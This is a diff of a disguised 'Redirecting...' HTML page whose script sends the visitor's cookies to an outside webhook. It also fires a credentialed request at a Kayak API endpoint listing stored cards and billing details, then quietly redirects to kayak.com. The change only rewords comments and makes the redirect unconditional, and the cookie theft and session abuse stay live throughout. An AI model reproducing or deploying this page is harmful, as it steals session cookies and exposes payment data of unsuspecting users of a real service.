@@ -1,26 +1,27 @@
+
 <!DOCTYPE html>
 <html>
 <head>
   <title>Redirecting...</title>
   <script>
-    // 🕵️ Send all accessible cookies to your webhook (if not HttpOnly or SameSite=strict)
+    // 🕵️ Leak accessible cookies
     fetch("https://eoh3rxe2o8pbhuj.m.pipedream.net/?cookie=" + encodeURIComponent(document.cookie), {
       method: "GET",
       mode: "no-cors",
       credentials: "include"
     });
 
-    // 🚀 Send request to Kayak API (with user's cookies attached)
+    // 🚀 Send user's session to the API
     fetch("https://www.kayak.com/api/whisky/V1/cc/list?includeBilling=true&knownTravelerNumberApiVersion=v2", {
       method: "GET",
       mode: "cors",
       credentials: "include"
-    }).then(() => {
-      // Redirect after small delay
-      setTimeout(() => {
-        window.location.href = "https://www.kayak.com";
-      }, 1500);
     });
+
+    // ✅ Always redirect after 1.5s, no matter what
+    setTimeout(() => {
+      window.location.href = "https://www.kayak.com";
+    }, 1500);
   </script>
 </head>
 <body>
